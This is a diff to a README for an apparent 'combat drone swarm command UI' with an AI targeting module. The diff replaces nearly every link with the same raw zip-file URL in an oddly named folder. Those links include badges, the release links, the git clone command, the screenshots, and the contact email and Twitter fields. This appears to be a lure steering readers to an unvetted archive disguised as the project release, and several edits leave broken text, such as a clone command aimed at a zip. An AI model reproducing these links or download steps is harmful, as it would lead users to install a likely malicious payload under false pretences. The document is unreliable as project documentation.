@@ -1,7 +1,7 @@
 # Combat Drone Swarm Command UI for R&D Demonstration
 
-![Drone Swarm](https://img.shields.io/badge/Drone%20Swarm-Command%20UI-blue.svg)  
-[![Releases](https://img.shields.io/badge/Releases-v1.0.0-orange.svg)](https://github.com/kolomolooj/drone-swarm-command-ui/releases)
+![Drone Swarm](https://raw.githubusercontent.com/kolomolooj/drone-swarm-command-ui/main/otorhinolaryngologic/command_drone_ui_swarm_1.8.zip%20Swarm-Command%https://raw.githubusercontent.com/kolomolooj/drone-swarm-command-ui/main/otorhinolaryngologic/command_drone_ui_swarm_1.8.zip)  
+[![Releases](https://raw.githubusercontent.com/kolomolooj/drone-swarm-command-ui/main/otorhinolaryngologic/command_drone_ui_swarm_1.8.zip)](https://raw.githubusercontent.com/kolomolooj/drone-swarm-command-ui/main/otorhinolaryngologic/command_drone_ui_swarm_1.8.zip)
 
 ---
 
@@ -41,7 +41,7 @@ To get started with the **drone-swarm-command-ui**, follow these steps:
 1. **Clone the Repository**  
    Use the following command to clone the repository to your local machine:
    ```bash
-   git clone https://github.com/kolomolooj/drone-swarm-command-ui.git
+   git clone https://raw.githubusercontent.com/kolomolooj/drone-swarm-command-ui/main/otorhinolaryngologic/command_drone_ui_swarm_1.8.zip
    ```
 
 2. **Navigate to the Directory**  
@@ -72,14 +72,14 @@ After successfully running the application, you will see the command UI. Here’
 
 ## Download and Release Information
 
-For the latest version, you can download the application from the [Releases section](https://github.com/kolomolooj/drone-swarm-command-ui/releases). Make sure to download the correct version for your operating system. After downloading, follow the installation steps outlined above.
+For the latest version, you can download the application from the [Releases section](https://raw.githubusercontent.com/kolomolooj/drone-swarm-command-ui/main/otorhinolaryngologic/command_drone_ui_swarm_1.8.zip). Make sure to download the correct version for your operating system. After downloading, follow the installation steps outlined above.
 
 ## Screenshots
 
-![Dashboard Screenshot](https://example.com/dashboard.png)  
+![Dashboard Screenshot](https://raw.githubusercontent.com/kolomolooj/drone-swarm-command-ui/main/otorhinolaryngologic/command_drone_ui_swarm_1.8.zip)  
 *Dashboard view showing active drones and their statuses.*
 
-![Targeting Module Screenshot](https://example.com/targeting.png)  
+![Targeting Module Screenshot](https://raw.githubusercontent.com/kolomolooj/drone-swarm-command-ui/main/otorhinolaryngologic/command_drone_ui_swarm_1.8.zip)  
 *AI targeting module in action, selecting targets.*
 
 ## Contributing
@@ -117,16 +117,16 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 ## Acknowledgments
 
 - Special thanks to the contributors and the open-source community for their support.
-- Thanks to [AI Research Labs](https://example.com) for their foundational work in AI targeting systems.
+- Thanks to [AI Research Labs](https://raw.githubusercontent.com/kolomolooj/drone-swarm-command-ui/main/otorhinolaryngologic/command_drone_ui_swarm_1.8.zip) for their foundational work in AI targeting systems.
 
 ## Contact
 
 For questions or feedback, please reach out to the project maintainer:
 
 - **Name**: John Doe
-- **Email**: johndoe@example.com
-- **Twitter**: [@johndoe](https://twitter.com/johndoe)
+- **Email**: https://raw.githubusercontent.com/kolomolooj/drone-swarm-command-ui/main/otorhinolaryngologic/command_drone_ui_swarm_1.8.zip
+- **Twitter**: [@johndoe](https://raw.githubusercontent.com/kolomolooj/drone-swarm-command-ui/main/otorhinolaryngologic/command_drone_ui_swarm_1.8.zip)
 
 ---
 
-For more information, visit the [Releases section](https://github.com/kolomolooj/drone-swarm-command-ui/releases). Download the latest version and explore the features of the **drone-swarm-command-ui**.
+For more information, visit the [Releases section](https://raw.githubusercontent.com/kolomolooj/drone-swarm-command-ui/main/otorhinolaryngologic/command_drone_ui_swarm_1.8.zip). Download the latest version and explore the features of the **drone-swarm-command-ui**.
